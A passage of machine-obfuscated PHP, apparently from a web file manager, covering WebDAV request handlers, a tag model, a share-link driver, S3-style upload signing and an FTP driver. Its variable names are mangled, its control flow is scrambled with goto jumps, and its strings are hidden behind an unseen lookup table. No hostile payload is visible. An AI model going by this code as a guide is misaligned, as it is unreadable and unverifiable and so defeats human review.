$Aœ†î¡Íî¡ = array($bó¥õ“çèñ); } else { $bó¥õ“çèñ[$aµŞß¤îã[28]] = $aµŞß¤îã[33]; $Aœ†î¡Íî¡ = array_merge(array($bó¥õ“çèñ), $Aœ†î¡Íî¡); } $eØ¼ö¾Ü¯ø = $aµŞß¤îã[33]; foreach ($Aœ†î¡Íî¡ as $FâÛ×ùÉô«) { $eØ¼ö¾Ü¯ø .= $this->parseItemXml($FâÛ×ùÉô«, $eÉäÎ¥éøñ); } goto E–‚¸Õó¼; E–‚¸Õó¼: return array($aµŞß¤îã[1796] => 207, $aµŞß¤îã[1797] => "\74\104\x3a\155\x75\x6c\x74\x69\x73\164\x61\164\165\163\40\170\x6d\x6c\156\163\72\104\75\42\104\x41\x56\72\x22\x3e\12{$eØ¼ö¾Ü¯ø}\xa\74\57\104\x3a\155\165\x6c\164\x69\x73\164\141\x74\x75\x73\x3e"); goto BŒŒš¹…¶£; BŒŒš¹…¶£: } public function httpHEAD() { $d›ÛôÎö‡ò =& $_SERVER[Æ]; $bÇÇöôñ = $this->pathInfo($this->path); if (!$bÇÇöôñ || $bÇÇöôñ[$d›ÛôÎö‡ò[29]] == $d›ÛôÎö‡ò[76]) { return array($d›ÛôÎö‡ò[1032] => 200, $d›ÛôÎö‡ò[1206] => array($d›ÛôÎö‡ò[1799])); } return array($d›ÛôÎö‡ò[1032] => 200, $d›ÛôÎö‡ò[1206] => array($d›ÛôÎö‡ò[1800], $d›ÛôÎö‡ò[136], $d›ÛôÎö‡ò[1801] . $bÇÇöôñ[$d›ÛôÎö‡ò[77]], $d›ÛôÎö‡ò[1802] . get_file_mime($bÇÇöôñ[$d›ÛôÎö‡ò[160]]), $d›ÛôÎö‡ò[132] . gmdate($d›ÛôÎö‡ò[1788], $bÇÇöôñ[$d›ÛôÎö‡ò[1253]]) . $d›ÛôÎö‡ò[1803], $d›ÛôÎö‡ò[1804])); } public function httpOPTIONS() { $C²†¬ÆŠ¿÷ =& $_SERVER[Æ]; return array($C²†¬ÆŠ¿÷[1032] => 200, $C²†¬ÆŠ¿÷[1206] => array($C²†¬ÆŠ¿÷[1805], $C²†¬ÆŠ¿÷[1806], $C²†¬ÆŠ¿÷[1807], $C²†¬ÆŠ¿÷[1262])); } public function httpPROPPATCH() { $bèÆê˜Šâ =& $_SERVER[Æ]; $A±¤¡†ª = $bèÆê˜Šâ[1808] . $_SERVER[$bèÆê˜Šâ[1385]] . $bèÆê˜Šâ[1809]; return array($bèÆê˜Šâ[1796] => 207, $bèÆê˜Šâ[1797] => "\x3c\104\x3a\x6d\165\154\x74\151\x73\x74\x61\x74\x75\163\40\x78\155\154\156\x73\x3a\x44\75\x22\x44\x41\126\72\42\x3e\12{$A±¤¡†ª}\12\x3c\x2f\104\72\x6d\165\x6c\164\151\x73\x74\141\164\x75\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $aÁÙ›ÌÔÆŒ =& $_SERVER[Æ]; $A‡˜†±‘ = $this->uploadFile(); if ($A‡˜†±‘) { $cò¢„±åé’ = 204; } else { $A‡˜†±‘ = $aÁÙ›ÌÔÆŒ[33]; $cò¢„±åé’ = 201; } $cè…‰õƒÒƒ = $this->pathPut($this->path, $A‡˜†±‘); if ($cè…‰õƒÒƒ == !1) { $cò¢„±åé’ = 404; } return array($aÁÙ›ÌÔÆŒ[1796] => $cò¢„±åé’); } private function uploadFile() { goto BŞÇ£É‹Ì•; Bò¶­é¼Ìæ: if (@filesize($càªÕ‰³´†) > 0) { return $càªÕ‰³´†; } @unlink($càªÕ‰³´†); return !1; goto cÒ›ÃøÛŒÌ; E¦Ä–øÕ÷à: while (!feof($Eï›øª”æ“)) { fwrite($Aôøä‹Åàë, fread($Eï›øª”æ“, 1024 * 200)); } fclose($Eï›øª”æ“); fclose($Aôøä‹Åàë); goto Bò¶­é¼Ìæ; bŠ•ˆ¿¹ßÙ: $Aôøä‹Åàë = @fopen($càªÕ‰³´†, $BÌ±Ø·–­£[1519]); $Eï›øª”æ“ = @fopen($BÌ±Ø·–­£[1811], $BÌ±Ø·–­£[1518]); if (!$Eï›øª”æ“ || !$Aôøä‹Åàë) { @unlink($càªÕ‰³´†); return !1; } goto E¦Ä–øÕ÷à; BŞÇ£É‹Ì•: $BÌ±Ø·–­£ =& $_SERVER[Æ]; @mk_dir(TEMP_FILES); $càªÕ‰³´† = TEMP_FILES . $BÌ±Ø·–­£[1810] . rand_string(32); goto bŠ•ˆ¿¹ßÙ; cÒ›ÃøÛŒÌ: } public function httpMKCOL() { $Cá‚ÍöË†º =& $_SERVER[Æ]; if ($this->pathExists($this->path)) { return array($Cá‚ÍöË†º[1032] => 409); } $C»‡Ê”ÉØ = $this->pathMkdir($this->path); return array($Cá‚ÍöË†º[1032] => $C»‡Ê”ÉØ ? 201 : 403); } public function httpMOVE() { $B§ŞóôˆÉ =& $_SERVER[Æ]; $FîÙ‡ÎØç = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$B§ŞóôˆÉ[1812]])) { $FÜÉ×ì¿ĞŒ[$B§ŞóôˆÉ[1813]] = $_SERVER[$B§ŞóôˆÉ[1812]] == $B§ŞóôˆÉ[1814]; } $Aº–«ãàğ = $this->pathMove($this->path, $FîÙ‡ÎØç); return array($B§ŞóôˆÉ[1032] => $Aº–«ãàğ ? 201 : 404); } public function httpCOPY() { $Aá¯ÇĞæ‚Ö = $this->parsePath($this->pathGet(!0)); $F®‡‘Š°® = $this->pathCopy($this->path, $Aá¯ÇĞæ‚Ö); return array($_SERVER[Æ][1032] => $F®‡‘Š°® ? 201 : 404); } public function httpDELETE() { $D„Çå“¼İ  = $this->pathRemove($this->path); return array($_SERVER[Æ][1032] => $D„Çå“¼İ  ? 200 : 503); } public function httpLOCK() { $eå‹Š®Ğöö =& $_SERVER[Æ]; $CÜİ¼¦²š = md5($this->path); $E¥Šä“Æœ— = $eå‹Š®Ğöö[1815] . $this->xmlGet($eå‹Š®Ğöö[1816]) . $eå‹Š®Ğöö[1817] . $CÜİ¼¦²š . $eå‹Š®Ğöö[1818]; return array($eå‹Š®Ğöö[1032] => 200, $eå‹Š®Ğöö[1206] => array($eå‹Š®Ğöö[1819] . $CÜİ¼¦²š, $eå‹Š®Ğöö[1820]), $eå‹Š®Ğöö[1821] => $E¥Šä“Æœ—); } public function httpUNLOCK() { return array($_SERVER[Æ][1032] => 204); } public function xmlGet($aî­á”è„ì) { goto bîÎó·ºóè; açœñâ¥Ô‡: return $b–è¥´§‘ğ[33]; goto D¨¢ÜíêÛ¾; bîÎó·ºóè: $b–è¥´§‘ğ =& $_SERVER[Æ]; static $bˆÂƒòáŒª = false; if (!$bˆÂƒòáŒª) { $aå™çÈç = file_get_contents($b–è¥´§‘ğ[1822]); $bˆÂƒòáŒª = new DOMDocument(); $bˆÂƒòáŒª->loadXML($aå™çÈç); } goto cµÕáÅ“ğš; cµÕáÅ“ğš: $CÛôÔÛÙ„ = array_shift(explode($b–è¥´§‘ğ[8], $aî­á”è„ì)); $a¯…à§Ã«‰ = $bˆÂƒòáŒª->getElementsByTagNameNS($b–è¥´§‘ğ[1823], $CÛôÔÛÙ„); if ($a¯…à§Ã«‰) { return $a¯…à§Ã«‰[0]->nodeValue; } goto açœñâ¥Ô‡; D¨¢ÜíêÛ¾: } public static function response($d¶„ÖäĞ¥Ø) { goto a–ƒµØ…šé; a–ƒµØ…šé: $AïÒ¥•å‡° =& $_SERVER[Æ]; $E˜ç´¹‹Ÿ“ = is_array($d¶„ÖäĞ¥Ø[$AïÒ¥•å‡°[1206]]) ? $d¶„ÖäĞ¥Ø[$AïÒ¥•å‡°[1206]] : array(); $E˜ç´¹‹Ÿ“[] = HttpHeader::code($d¶„ÖäĞ¥Ø[$AïÒ¥•å‡°[1032]]); goto F¶´†ùÃ•; F¶´†ùÃ•: $E˜ç´¹‹Ÿ“[] = $AïÒ¥•å‡°[1763]; $E˜ç´¹‹Ÿ“[] = $AïÒ¥•å‡°[1764]; foreach ($E˜ç´¹‹Ÿ“ as $F÷£œ³Ë¦÷) { header($F÷£œ³Ë¦÷); } goto e×¨ùß›™„; e×¨ùß›™„: if (is_string($d¶„ÖäĞ¥Ø[$AïÒ¥•å‡°[1821]])) { header($AïÒ¥•å‡°[1824]); $b¦ÇñùãØ† = $AïÒ¥•å‡°[1825] . $AïÒ¥•å‡°[217] . $d¶„ÖäĞ¥Ø[$AïÒ¥•å‡°[1821]]; echo $b¦ÇñùãØ†; } goto BÈÊŒ‡¼»ğ; BÈÊŒ‡¼»ğ: } } goto f»ñöÔ×ç; eÆÍèòïœñ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\x2e\164\141\147\x4c\x69\163\164"; public $modelType = "\125\163\145\162\x4f\x70\x74\151\x6f\x6e"; public $field = array("\156\141\155\x65", "\163\164\171\x6c\145", "\163\x6f\x72\164"); public function listData($FòÖóÚëÅî = false, $a’¿‡„® ó = "\x73\157\x72\x74", $f—¡†òòŸ‚ = false) { return parent::listData($FòÖóÚëÅî, $a’¿‡„® ó, $f—¡†òòŸ‚); } public function remove($Bô”ËÇ‚Ô¥) { return parent::remove($Bô”ËÇ‚Ô¥); } public function add($d±Í–ø©ğ, $f£¶Òó¥Ö = "\x6c\x61\142\x65\154\55\147\162\x65\x79\55\x6e\157\162\155\141\x6c") { $D†óÀàÕä =& $_SERVER[Æ]; if ($this->findByName($d±Í–ø©ğ)) { return !1; } $D­¹©’™ªˆ = array($D†óÀàÕä[386] => $d±Í–ø©ğ, $D†óÀàÕä[437] => $f£¶Òó¥Ö, $D†óÀàÕä[2105] => $this->getSort($D†óÀàÕä[246]) + 1); return parent::insert($D­¹©’™ªˆ); } public function update($Bã¬Ã•…Üœ, $cŞ©êÁ·íô) { $bµù‡¹Çì‘ =& $_SERVER[Æ]; $aìŒììù± = $this->listData($Bã¬Ã•…Üœ); $a¼›‚Œîë = $this->findByName($cŞ©êÁ·íô[$bµù‡¹Çì‘[28]]); if (!$aìŒììù± || $a¼›‚Œîë && $a¼›‚Œîë[$bµù‡¹Çì‘[367]] != $aìŒììù±[$bµù‡¹Çì‘[367]]) { return !1; } return parent::update($Bã¬Ã•…Üœ, $cŞ©êÁ·íô); } public function moveTop($b²ÒòÊªÌ”) { $fŒÓ×–©Á‘ =& $_SERVER[Æ]; $b†¢ßÇÔöÚ = parent::listData(); $d´îŠˆöé¶ = $this->getSort($fŒÓ×–©Á‘[245]); foreach ($b†¢ßÇÔöÚ as &$E¹Œ„®îßã) { if ($E¹Œ„®îßã[$fŒÓ×–©Á‘[367]] == $b²ÒòÊªÌ”) { $E¹Œ„®îßã[$fŒÓ×–©Á‘[2122]] = $d´îŠˆöé¶; continue; } $E¹Œ„®îßã[$fŒÓ×–©Á‘[2122]] += 1; } return parent::resetData($b†¢ßÇÔöÚ); } public function moveBottom($bßÇÇßàïè) { $A¬Õ˜ÅÉÜã =& $_SERVER[Æ]; $fßáÂ°­Ğ¿ = $this->getSort($A¬Õ˜ÅÉÜã[246]) + 1; return parent::update($bßÇÇßàïè, array($A¬Õ˜ÅÉÜã[2122] => $fßáÂ°­Ğ¿)); } public function resetSort($E•ÜÊ›‡Ø) { goto c‘ê¨˜œÚò; c‘ê¨˜œÚò: $cÕùÈ†ãÁš =& $_SERVER[Æ]; $a„åâÛ…Ó = array(); $E•ÜÊ›‡Ø = is_array($E•ÜÊ›‡Ø) ? $E•ÜÊ›‡Ø : array(); goto dßˆİÄóªØ; dßˆİÄóªØ: for ($D·Ê–ÙÄµ« = 0; $D·Ê–ÙÄµ« < count($E•ÜÊ›‡Ø); $D·Ê–ÙÄµ«++) { $a„åâÛ…Ó[$E•ÜÊ›‡Ø[$D·Ê–ÙÄµ«] . $cÕùÈ†ãÁš[33]] = $D·Ê–ÙÄµ« + 1; } $b°Åñ—Š¨¢ = parent::listData(); foreach ($b°Åñ—Š¨¢ as &$aœ¡±ïÂ©) { $EÂßÔ˜Òµ = $a„åâÛ…Ó[$aœ¡±ïÂ©[$cÕùÈ†ãÁš[367]]]; $aœ¡±ïÂ©[$cÕùÈ†ãÁš[2122]] = $EÂßÔ˜Òµ ? $EÂßÔ˜Òµ : $aœ¡±ïÂ©[$cÕùÈ†ãÁš[2122]]; } goto Bß‰»«ğÆÛ; Bß‰»«ğÆÛ: return parent::resetData($b°Åñ—Š¨¢); goto EÒŸ§…‘‚; EÒŸ§…‘‚: } private function getSort($eÈ£ô‚‘¯î) { $CÒâà˜ô× =& $_SERVER[Æ]; $BƒäŸÔê² = parent::listData(); $d³Â©Ù™öˆ = array_to_keyvalue($BƒäŸÔê², $CÒâà˜ô×[33], $CÒâà˜ô×[2122]); if (!$d³Â©Ù™öˆ) { $d³Â©Ù™öˆ = array(0); } $f˜Ú÷ÄÒÓÎ = $eÈ£ô‚‘¯î == $CÒâà˜ô×[246] ? max($d³Â©Ù™öˆ) : min($d³Â©Ù™öˆ); return intval($f˜Ú÷ÄÒÓÎ); } } goto A™ÌèÜŸàŠ; b´¾¿òÍÁ©: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($a„­‡æáÆ™) { $this->pathParse = $a„­‡æáÆ™; } protected function infoParse($cÜœ¿·Û¶, $d¢§íÕ¤ô = false) { $D×À½æìê =& $_SERVER[Æ]; return Action($D×À½æìê[1017])->sharePathInfo($this->pathParse[$D×À½æìê[75]], !0, $d¢§íÕ¤ô); } public function listPath($AñÌà£‹×, $fêåÊï‰©× = false) { $A¾£Ã«Å£ =& $_SERVER[Æ]; $Aç–æ¡ìØ´ = IO::listPath($AñÌà£‹×, $fêåÊï‰©×); foreach ($Aç–æ¡ìØ´ as $DÇÛƒóŸ› => $BÖ·ˆƒ¯‡) { if (!in_array($DÇÛƒóŸ›, array($A¾£Ã«Å£[73], $A¾£Ã«Å£[74]))) { continue; } foreach ($BÖ·ˆƒ¯‡ as $Cç”¼¹ğİŠ => $fÖÇ‚¸ˆÁ„) { $fÖÇ‚¸ˆÁ„ = Action($A¾£Ã«Å£[1132])->parsePathChildren($fÖÇ‚¸ˆÁ„, array($A¾£Ã«Å£[387] => $AñÌà£‹×)); $Aç–æ¡ìØ´[$DÇÛƒóŸ›][$Cç”¼¹ğİŠ] = Action($A¾£Ã«Å£[1017])->shareItemInfo($fÖÇ‚¸ˆÁ„); } } return $Aç–æ¡ìØ´; } public function listAll($eé‡–ÜÑœç) { $E¼È­™ØÉ =& $_SERVER[Æ]; $fº©ÏÌŒÓ = IO::listAll($eé‡–ÜÑœç); foreach ($fº©ÏÌŒÓ as &$A»©‡—”¨) { $A»©‡—”¨ = array_merge(IO::info($A»©‡—”¨[$E¼È­™ØÉ[75]]), $A»©‡—”¨); $A»©‡—”¨[$E¼È­™ØÉ[391]] = Action($E¼È­™ØÉ[1017])->shareItemInfo($A»©‡—”¨); } return $fº©ÏÌŒÓ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($B‰Ø–ï›Ïê) { parent::__construct($B‰Ø–ï›Ïê); $this->signatureVersion($_SERVER[Æ][200]); } public function uploadFormData($cÊ³ˆÈ´, $FË‘å¬¨Êß = 3600) { goto D•¿½‹™Ï; d§¡öĞ Íã: $dÈ¸›ÊòŒ› = base64_encode(json_encode($Cˆ·ù„íÄá)); $eò¢áÊ³Ñ¦ = hash_hmac($C¥‘Š‘ôÏ¯[1143], $dâò×–²–ì, $C¥‘Š‘ôÏ¯[1144] . $this->secret, !0); $C Éñå·“ì = hash_hmac($C¥‘Š‘ôÏ¯[1143], $this->region, $eò¢áÊ³Ñ¦, !0); goto AéÕ°³Ì´; D•¿½‹™Ï: $C¥‘Š‘ôÏ¯ =& $_SERVER[Æ]; $bè¨ìíÍÂá = $C¥‘Š‘ôÏ¯[185]; $fÂÀœ‡’ = $C¥‘Š‘ôÏ¯[1133]; goto FØÈ•‡äè; eŠ³êŠ«ìÈ: $EÔ‡ê¹Ğ°Á = array($C¥‘Š‘ôÏ¯[199] => $C¥‘Š‘ôÏ¯[33], $C¥‘Š‘ôÏ¯[1145] => $C¥‘Š‘ôÏ¯[33], $C¥‘Š‘ôÏ¯[1104] => $bè¨ìíÍÂá, $C¥‘Š‘ôÏ¯[1108] => $d›á²— , $C¥‘Š‘ôÏ¯[1112] => $dÈ¸›ÊòŒ›, $C¥‘Š‘ôÏ¯[1146] => $A â¡ĞİËÄ, $C¥‘Š‘ôÏ¯[1147] => $fÂÀœ‡’, $C¥‘Š‘ôÏ¯[1148] => $DŞˆ‡§á–ï, $C¥‘Š‘ôÏ¯[1149] => $A•‘¦ÈÆ, $C¥‘Š‘ôÏ¯[1150] => $D¿‚›ÈÓ¹°, $C¥‘Š‘ôÏ¯[169] => $this->getHost()); return $EÔ‡ê¹Ğ°Á; goto bÍóÙöÊ¦Õ; aĞÓÆ¯Ğïø: $eµ‹õÄ¿Ã® = array($this->accessKey, $dâò×–²–ì, $this->region, $cÇã·ÊÓá­, $C®¾¾¬Æ²ğ); $A â¡ĞİËÄ = implode($C¥‘Š‘ôÏ¯[8], $eµ‹õÄ¿Ã®); $Cˆ·ù„íÄá = array($C¥‘Š‘ôÏ¯[1102] => gmdate($C¥‘Š‘ôÏ¯[1101], strtotime($C¥‘Š‘ôÏ¯[1136])), $C¥‘Š‘ôÏ¯[1103] => array(array($C¥‘Š‘ôÏ¯[1105] => $this->bucket), array($C¥‘Š‘ôÏ¯[1104] => $bè¨ìíÍÂá), array($C¥‘Š‘ôÏ¯[1106], $C¥‘Š‘ôÏ¯[1107], $C¥‘Š‘ôÏ¯[33]), array($C¥‘Š‘ôÏ¯[1106], $C¥‘Š‘ôÏ¯[1137], $C¥‘Š‘ôÏ¯[33]), array($C¥‘Š‘ôÏ¯[1106], $C¥‘Š‘ôÏ¯[1138], $C¥‘Š‘ôÏ¯[33]), array($C¥‘Š‘ôÏ¯[1108] => $d›á²— ), array($C¥‘Š‘ôÏ¯[1139] => $A â¡ĞİËÄ), array($C¥‘Š‘ôÏ¯[1140] => $fÂÀœ‡’), array($C¥‘Š‘ôÏ¯[1141] => $DŞˆ‡§á–ï), array($C¥‘Š‘ôÏ¯[1142] => $A•‘¦ÈÆ))); goto d§¡öĞ Íã; AéÕ°³Ì´: $FÚ¾ÏäÑ = hash_hmac($C¥‘Š‘ôÏ¯[1143], $cÇã·ÊÓá­, $C Éñå·“ì, !0); $bå””Š’ãò = hash_hmac($C¥‘Š‘ôÏ¯[1143], $C®¾¾¬Æ²ğ, $FÚ¾ÏäÑ, !0); $D¿‚›ÈÓ¹° = hash_hmac($C¥‘Š‘ôÏ¯[1143], $dÈ¸›ÊòŒ›, $bå””Š’ãò); goto eŠ³êŠ«ìÈ; d—ÀèåŒùÕ: $C®¾¾¬Æ²ğ = $C¥‘Š‘ôÏ¯[1135]; $A•‘¦ÈÆ = $FË‘å¬¨Êß . $C¥‘Š‘ôÏ¯[33]; $d›á²—  = $C¥‘Š‘ôÏ¯[1100]; goto aĞÓÆ¯Ğïø; FØÈ•‡äè: $cÇã·ÊÓá­ = $C¥‘Š‘ôÏ¯[59]; $DŞˆ‡§á–ï = gmdate($C¥‘Š‘ôÏ¯[1134]); $dâò×–²–ì = gmdate($C¥‘Š‘ôÏ¯[688]); goto d—ÀèåŒùÕ; bÍóÙöÊ¦Õ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($fƒÉé¹¦´) { parent::__construct(); if (count($fƒÉé¹¦´) > 0) { $this->_init($fƒÉé¹¦´); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($fÂÕê¾„¦) { $C…´öõÚ‰ƒ =& $_SERVER[Æ]; global $config; $this->appCharset = $config[$C…´öõÚ‰ƒ[1151]]; $this->systemCharset = $config[$C…´öõÚ‰ƒ[1152]]; if (isset($fÂÕê¾„¦[$C…´öõÚ‰ƒ[1153]]) && $fÂÕê¾„¦[$C…´öõÚ‰ƒ[1153]]) { $this->systemCharset = $fÂÕê¾„¦[$C…´öõÚ‰ƒ[1153]]; } } public function iconvApp($d¤µª÷‰Ö) { return $this->iconvTo($d¤µª÷‰Ö, $this->systemCharset, $this->appCharset); } public function iconvSystem($cš‚½ÎÓ‘) { return $this->iconvTo($cš‚½ÎÓ‘, $this->appCharset, $this->systemCharset); } public function getPathOuter($cÌ…İç¾èµ) { goto D»ç×¬Øëá; DØ„ÅŒÙÍ˜: return $this->pathDriver . $cíß«°‡„µ[8] . ltrim($cÌ…İç¾èµ, $cíß«°‡„µ[8]); goto BòÜ›‚«æê; D»ç×¬Øëá: $cíß«°‡„µ =& $_SERVER[Æ]; $FËß‹œâŞß = $this->iconvApp($this->pathBase); $cÌ…İç¾èµ = $this->iconvApp($cÌ…İç¾èµ); goto A´ãô±Ÿ§ƒ; A´ãô±Ÿ§ƒ: if (substr($FËß‹œâŞß, 0, 2) == $cíß«°‡„µ[1154]) { $FËß‹œâŞß = BASIC_PATH . substr($FËß‹œâŞß, 2); } if (substr($cÌ…İç¾èµ, 0, 2) == $cíß«°‡„µ[1154]) { $cÌ…İç¾èµ = BASIC_PATH . substr($cÌ…İç¾èµ, 2); } $FËß‹œâŞß = KodIO::clear($FËß‹œâŞß); goto EÖ¡ä´æ£“; EÖ¡ä´æ£“: $cÌ…İç¾èµ = KodIO::clear($cÌ…İç¾èµ); $cÌ…İç¾èµ = substr($cÌ…İç¾èµ, strlen($FËß‹œâŞß)); if (empty($this->pathDriver)) { return $cÌ…İç¾èµ; } goto DØ„ÅŒÙÍ˜; BòÜ›‚«æê: } private function _init($dÈƒ¥²· = array()) { goto DÕÙâ§»’â; CåÑºòÁÊ£: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $bºÂ«…Ù¤ƒ[$aß«¹„ì‰] = array($f­©ˆõÂò[1160] => $this->connect, $f­©ˆõÂò[169] => $this->host, $f­©ˆõÂò[168] => $this->scheme, $f­©ˆõÂò[170] => $this->port); goto dò·¬Ö¨¦; eŒ‰í’ì«Ù: if (isset($bºÂ«…Ù¤ƒ[$aß«¹„ì‰])) { foreach ($bºÂ«…Ù¤ƒ[$aß«¹„ì‰] as $e„Ã²‘À¹ƒ => $Cø‚¾ËŠÌô) { $this->{$e„Ã²‘À¹ƒ} = $Cø‚¾ËŠÌô; } return !0; } $F¿Ã²ÉµÆ´ = parse_url(trim($this->server, $f­©ˆõÂò[8])); $this->host = $F¿Ã²ÉµÆ´[$f­©ˆõÂò[169]]; goto C¶®Ş„®ä; F“§‡“îõ: foreach ($dÈƒ¥²· as $e„Ã²‘À¹ƒ => $Cø‚¾ËŠÌô) { if (isset($this->{$e„Ã²‘À¹ƒ})) { $this->{$e„Ã²‘À¹ƒ} = $Cø‚¾ËŠÌô; } } static $bºÂ«…Ù¤ƒ = array(); $aß«¹„ì‰ = md5(json_encode($dÈƒ¥²·)); goto eŒ‰í’ì«Ù; C¶®Ş„®ä: $F× ¾³ÆîÖ = isset($F¿Ã²ÉµÆ´[$f­©ˆõÂò[168]]) && $F¿Ã²ÉµÆ´[$f­©ˆõÂò[168]] == $f­©ˆõÂò[1157] ? !0 : !1; $this->scheme = $F× ¾³ÆîÖ ? $f­©ˆõÂò[1158] : $f­©ˆõÂò[1159]; $this->port = isset($F¿Ã²ÉµÆ´[$f­©ˆõÂò[170]]) ? $F¿Ã²ÉµÆ´[$f­©ˆõÂò[170]] : 21; goto eÛ¸ÛÄµƒ´; DÕÙâ§»’â: $f­©ˆõÂò =& $_SERVER[Æ]; if (!function_exists($f­©ˆõÂò[1155])) { show_json(LNG($f­©ˆõÂò[1156]), !1); } $this->charsetReset($dÈƒ¥²·); goto F“§‡“îõ; eÛ¸ÛÄµƒ´: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $fĞøÀ†…Ãš = @ftp_login($this->connect, $this->username, $this->userpass); goto CåÑºòÁÊ£; dò·¬Ö¨¦: return $fĞøÀ†…Ãš; goto Eº¹ğ…Ü—; Eº¹ğ…Ü—: } private function _isconn() { return is_resource($this->connect); } public function mkfile($Fªå»ëèÛƒ, $eÈÅ¼®Œ§Í = '', $EâŞÑˆ„óŠ = REPEAT_RENAME) { if ($this->setContent($Fªå»ëèÛƒ, $eÈÅ¼®Œ§Í)) { return $this->getPathOuter($Fªå»ëèÛƒ); } return !1; } public function mkdir($A†÷›ÖŸ®Æ, $DçÇ´áïª = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $A†÷›ÖŸ®Æ = $this->iconvSystem($A†÷›ÖŸ®Æ); if ($this->isFolder($A†÷›ÖŸ®Æ) || @ftp_mkdir($this->connect, $A†÷›ÖŸ®Æ)) { return $this->getPathOuter($A†÷›ÖŸ®Æ); } if (!$this->mkdir($this->pathFather($A†÷›ÖŸ®Æ))) { return !1; } if ($A†÷›ÖŸ®Æ = @ftp_mkdir($this->connect, $A†÷›ÖŸ®Æ)) { return $this->getPathOuter($A†÷›ÖŸ®Æ); } return !1; } public function copyFile($aå‰õ­¡È, $AÑØ‡Êæø) { goto dŸÜÉÍÏÚ; Bí¦ÈŞÉ‹«: $this->tempFileRemve($d›‚”â‚× ); return $b¸ì ‹ªĞ; goto aŞ ‹İÕ®¬; B±•ÖÚ‹î: $a®¦æ¿Â = $this->iconvApp($d›‚”â‚× ); $this->download($aå‰õ­¡È, $a®¦æ¿Â); $b¸ì ‹ªĞ = $this->upload($AÑØ‡Êæø, $a®¦æ¿Â); goto Bí¦ÈŞÉ‹«; dŸÜÉÍÏÚ: if (!$this->_isconn()) { return !1; } $D¨à´‹ªã˜ = $this->pathThis($this->iconvSystem($aå‰õ­¡È)); $d›‚”â‚×  = $this->tempFile($D¨à´‹ªã˜); goto B±•ÖÚ‹î; aŞ ‹İÕ®¬: } public function moveFile($dŠ›³İ¡À, $aÖ˜‰‹ÉÛ¨) { if (!$this->_isconn()) { return !1; } $dŠ›³İ¡À = $this->iconvSystem($dŠ›³İ¡À); $aÖ˜‰‹ÉÛ¨ = $this->iconvSystem($aÖ˜‰‹ÉÛ¨); $CÇ¦…¸´Ü = @ftp_rename($this->connect, $dŠ›³İ¡À, $aÖ˜‰‹ÉÛ¨); return $CÇ¦…¸´Ü ? $this->getPathOuter($aÖ˜‰‹ÉÛ¨) : !1; } public function delFile($D°»›îÜ„å) { if (!$this->_isconn()) { return !1; } $D°»›îÜ„å = $this->iconvSystem($D°»›îÜ„å); return @ftp_delete($this->connect, $D°»›îÜ„å); } public function delFolder($B‚»Ò¹¾©) { if (!$this->_isconn()) { return !1; } $B‚»Ò¹¾© = $this->iconvSystem($B‚»Ò¹¾©); $aé“çï³‰È = $this->ftpList($B‚»Ò¹¾©); if (!$aé“çï³‰È) { return @ftp_rmdir($this->connect, $B‚»Ò¹¾©); } foreach ($aé“çï³‰È as $D§¡ÉŞŸ©ê) { if ($this->isFolder($D§¡ÉŞŸ©ê)) { $D§¡ÉŞŸ©ê = $this->iconvApp($D§¡ÉŞŸ©ê); $this->delFolder($D§¡ÉŞŸ©ê); } else { @ftp_delete($this->connect, $D§¡ÉŞŸ©ê); } } return @ftp_rmdir($this->connect, $B‚»Ò¹¾©); } public function rename($a¢¾ËàËƒ, $d±ÇÅˆîß) { goto fëÖà·°É; aö’›ºïË°: $B—ÁŒ·ó‚° = $this->iconvSystem($B—ÁŒ·ó‚°); $a¢¾ËàËƒ = $this->iconvSystem($a¢¾ËàËƒ); $dàïš©Â¬ = $this->pathFather($a¢¾ËàËƒ); goto d„’Ò‡×›; EÃ¥Ã·š³¨: return $Bµ®À¹¹ª„ ? $this->getPathOuter($c®‘é×‹Ÿ‘) : !1; goto AÌ½àš¦ŸÙ; fëÖà·°É: $a‚ø’ƒè‘à =& $_SERVER[Æ]; if (!$this->_isconn()) { return !1; } $B—ÁŒ·ó‚° = $this->fileNameAuto($this->pathFather($a¢¾ËàËƒ), $d±ÇÅˆîß); goto aö’›ºïË°; d„’Ò‡×›: $c®‘é×‹Ÿ‘ = rtrim($dàïš©Â¬, $a‚ø’ƒè‘à[8]) . $a‚ø’ƒè‘à[8] . $B—ÁŒ·ó‚°; $Bµ®À¹¹ª„ = @ftp_rename($this->connect, $a¢¾ËàËƒ, $c®‘é×‹Ÿ‘); $c®‘é×‹Ÿ‘ = $this->iconvApp($c®‘é×‹Ÿ‘); goto EÃ¥Ã·š³¨; AÌ½àš¦ŸÙ: } private function folderInfo($FÊ±ÛâÖ²á, $cÆ­êŸÆ‘‡ = false) { goto F•âÊ”øÕÄ; F•âÊ”øÕÄ: $FÕÏà ©Í =& $_SERVER[Æ]; $bÚ²…î¦¦Š = $this->getPathOuter(rtrim($FÊ±ÛâÖ²á, $FÕÏà ©Í[8])); $cêÂ«Â´á° = $this->pathThis($bÚ²…î¦¦Š); goto Dµ¹ñãÏ°Â; D¢¨Ö´¼¸—: return $E½‹å†ïÜæ; goto dñà‡ÀİªĞ; Dµ¹ñãÏ°Â: $Eš“§İó‡ = $this->iconvSystem($FÊ±ÛâÖ²á); if ($cÆ­êŸÆ‘‡) { return array($FÕÏà ©Í[28] => $cêÂ«Â´á°, $FÕÏà ©Í[75] => $bÚ²…î¦¦Š, $FÕÏà ©Í[29] => $FÕÏà ©Í[76]); } $E½‹å†ïÜæ = array($FÕÏà ©Í[28] => $cêÂ«Â´á°, $FÕÏà ©Í[75] => $bÚ²…î¦¦Š, $FÕÏà ©Í[29] => $FÕÏà ©Í[76], $FÕÏà ©Í[187] => 0, $FÕÏà ©Í[107] => 0, $FÕÏà ©Í[1161] => !0, $FÕÏà ©Í[1162] => !0); goto D¢¨Ö´¼¸—; dñà‡ÀİªĞ: } private function 